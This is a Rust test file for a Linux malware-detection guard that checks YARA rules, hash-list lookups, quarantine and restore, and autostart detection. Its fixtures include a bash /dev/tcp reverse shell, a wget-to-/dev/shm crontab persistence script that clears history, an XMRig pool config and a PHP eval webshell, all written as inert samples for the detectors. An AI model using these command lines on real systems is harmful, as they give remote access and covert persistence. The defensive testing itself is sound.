//! Rules, hash list and the guard working together. All samples are inert text.

use std::fs;
use std::path::Path;
use std::sync::Arc;

use wachposten_core::crontab::NoCrontab;
use wachposten_core::{Config, Guard, Kind, Outcome, Severity, Status};
use wachposten_scan::hashdb::KnownHash;
use wachposten_scan::{HashDb, MalwareScanner, YaraEngine, sha256_file};

const TEST_SIGNATURE: &str = "WACHPOSTEN-TEST-SIGNATURE-7f3a9c2e-NOT-MALWARE";

fn names(engine: &YaraEngine, path: &Path) -> Vec<String> {
    engine
        .scan_file(path)
        .unwrap()
        .into_iter()
        .map(|m| m.rule)
        .collect()
}

#[test]
fn builtin_rules_compile_and_match() {
    let engine = YaraEngine::new(&[]);
    assert!(engine.sources[0].result.is_ok(), "{:?}", engine.sources[0]);
    assert!(engine.rule_count() >= 8);
    let dir = tempfile::tempdir().unwrap();
    let file = |name: &str, content: &str| {
        let p = dir.path().join(name);
        fs::write(&p, content).unwrap();
        p
    };

    let test = file("test.txt", &format!("hello {TEST_SIGNATURE}\n"));
    assert_eq!(names(&engine, &test), ["Wachposten_Test_Signature"]);

    let revshell = file(
        "r.sh",
        "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n",
    );
    assert_eq!(names(&engine, &revshell), ["Linux_ReverseShell_Script"]);

    let installer = file(
        "i.sh",
        "#!/bin/bash\nwget -q http://x.example/k -O /dev/shm/.k\nchmod +x /dev/shm/.k\n\
         (crontab -l; echo '* * * * * /dev/shm/.k') | crontab -\nnohup /dev/shm/.k > /dev/null 2>&1 &\nhistory -c\n",
    );
    assert_eq!(
        names(&engine, &installer),
        ["Linux_Persistence_Installer_Script"]
    );

    let miner = file(
        "config.json",
        "{\"donate-level\": 0, \"pools\": [{\"url\": \"stratum+tcp://pool.example:3333\"}], \"xmrig\": true}",
    );
    assert_eq!(names(&engine, &miner), ["Linux_Miner_XMRig"]);

    let shell = file(
        "s.php",
        "<?php if(isset($_POST['c'])){ eval(base64_decode($_POST['c'])); } ?>",
    );
    assert_eq!(names(&engine, &shell), ["Web_PHP_Webshell_Eval"]);
}

#[test]
fn harmless_files_do_not_match() {
    let engine = YaraEngine::new(&[]);
    let dir = tempfile::tempdir().unwrap();
    let benign = [
        "#!/bin/sh\n# installer\ncurl -fsSL https://example.org/tool.tar.gz -o /tmp/tool.tgz\ntar xzf /tmp/tool.tgz\necho 'export PATH=$HOME/.tool/bin:$PATH' >> ~/.bashrc\n",
        "[Desktop Entry]\nExec=/usr/bin/nextcloud --background\n",
        "import socket\ns = socket.socket()\ns.connect((\"example.org\", 80))\n",
    ];
    for (i, content) in benign.iter().enumerate() {
        let p = dir.path().join(format!("b{i}"));
        fs::write(&p, content).unwrap();
        assert!(
            names(&engine, &p).is_empty(),
            "false positive on sample {i}"
        );
    }
    for bin in ["/usr/bin/ls", "/usr/bin/bash", "/usr/bin/curl"] {
        if Path::new(bin).exists() {
            assert!(
                names(&engine, Path::new(bin)).is_empty(),
                "false positive on {bin}"
            );
        }
    }
}

#[test]
fn extra_rule_dirs_skip_broken_files() {
    let rules = tempfile::tempdir().unwrap();
    fs::write(
        rules.path().join("good.yar"),
        "rule Extra_Good { strings: $a = \"extra-marker-123\" condition: $a }",
    )
    .unwrap();
    fs::write(
        rules.path().join("broken.yar"),
        "rule Broken { condition: nope }",
    )
    .unwrap();
    fs::write(rules.path().join("readme.txt"), "not a rule").unwrap();
    let engine = YaraEngine::new(&[rules.path().to_path_buf()]);
    assert_eq!(engine.sources.len(), 3);
    let broken = engine.sources.iter().find(|s| s.name == "broken").unwrap();
    assert!(broken.result.is_err());

    let sample = rules.path().join("sample.bin");
    fs::write(&sample, "xx extra-marker-123 xx").unwrap();
    assert_eq!(names(&engine, &sample), ["Extra_Good"]);
}

fn guard_with_scanner(home: &Path) -> (Guard, Arc<MalwareScanner>) {
    let config = Config {
        home: home.to_path_buf(),
        data_dir: home.join(".local/share/wachposten"),
        crontab: false,
        systemctl: false,
    };
    let mut guard = Guard::with_crontab(config.clone(), Box::new(NoCrontab)).unwrap();
    let db = HashDb::open(&config.data_dir.join("hashes.db")).unwrap();
    let scanner = Arc::new(MalwareScanner::new(
        Some(YaraEngine::new(&[])),
        Some(db),
        None,
        256,
    ));
    guard.set_scanner(scanner.clone());
    guard.initialize().unwrap();
    (guard, scanner)
}

#[test]
fn hash_list_flags_download_and_decisions_work() {
    let home = tempfile::tempdir().unwrap();
    let (mut guard, scanner) = guard_with_scanner(home.path());
    let downloads = home.path().join("Downloads");
    fs::create_dir_all(&downloads).unwrap();
    let invoice = downloads.join("invoice.pdf.exe");
    fs::write(&invoice, "MZ pretend this is a known sample").unwrap();
    scanner
        .hashes
        .as_ref()
        .unwrap()
        .insert(
            &[KnownHash {
                sha256: sha256_file(&invoice).unwrap(),
                signature: Some("AgentTesla".into()),
                first_seen: None,
            }],
            "test",
        )
        .unwrap();

    let findings = wachposten_core::FileScanner::scan(scanner.as_ref(), &invoice);
    assert_eq!(findings.len(), 1);
    assert!(findings[0].line.contains("AgentTesla"));
    let ev = guard
        .record_detection(&invoice, &findings)
        .unwrap()
        .unwrap();
    assert_eq!(ev.kind, Kind::Download);
    assert_eq!(ev.severity, Severity::Malicious);
    // Recording again does not create a second event, and a rescan keeps it open.
    assert!(
        guard
            .record_detection(&invoice, &findings)
            .unwrap()
            .is_none()
    );
    assert!(guard.rescan().unwrap().is_empty());
    assert_eq!(guard.store().open_events().unwrap().len(), 1);

    let Outcome::Removed {
        quarantine_id: Some(q),
    } = guard.remove(ev.id, Some(ev.new_hash())).unwrap()
    else {
        panic!("expected removal");
    };
    assert!(!invoice.exists());

    // Restoring puts it back and remembers the decision.
    guard.restore(q, false).unwrap();
    assert!(invoice.exists());
    assert!(
        guard
            .record_detection(&invoice, &findings)
            .unwrap()
            .is_none()
    );
}

#[test]
fn deleted_download_closes_event() {
    let home = tempfile::tempdir().unwrap();
    let (mut guard, scanner) = guard_with_scanner(home.path());
    let file = home.path().join("test.txt");
    fs::write(&file, TEST_SIGNATURE).unwrap();
    let findings = wachposten_core::FileScanner::scan(scanner.as_ref(), &file);
    let ev = guard.record_detection(&file, &findings).unwrap().unwrap();
    fs::remove_file(&file).unwrap();
    guard.rescan().unwrap();
    assert_eq!(
        guard.store().event(ev.id).unwrap().unwrap().status,
        Status::Reverted
    );
}

#[test]
fn autostart_pointing_to_malware_is_malicious() {
    let home = tempfile::tempdir().unwrap();
    let (mut guard, _scanner) = guard_with_scanner(home.path());
    let payload = home.path().join(".local/lib/upd.sh");
    fs::create_dir_all(payload.parent().unwrap()).unwrap();
    fs::write(
        &payload,
        "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n",
    )
    .unwrap();
    let entry = home.path().join(".config/autostart/upd.desktop");
    fs::create_dir_all(entry.parent().unwrap()).unwrap();
    fs::write(
        &entry,
        "[Desktop Entry]\nType=Application\nExec=~/.local/lib/upd.sh\n",
    )
    .unwrap();

    let ev = guard.rescan().unwrap().remove(0);
    assert_eq!(ev.severity, Severity::Malicious);
    assert!(
        ev.findings
            .iter()
            .any(|f| f.line.contains("Linux_ReverseShell_Script") && f.line.contains("upd.sh")),
        "{:?}",
        ev.findings
    );
}
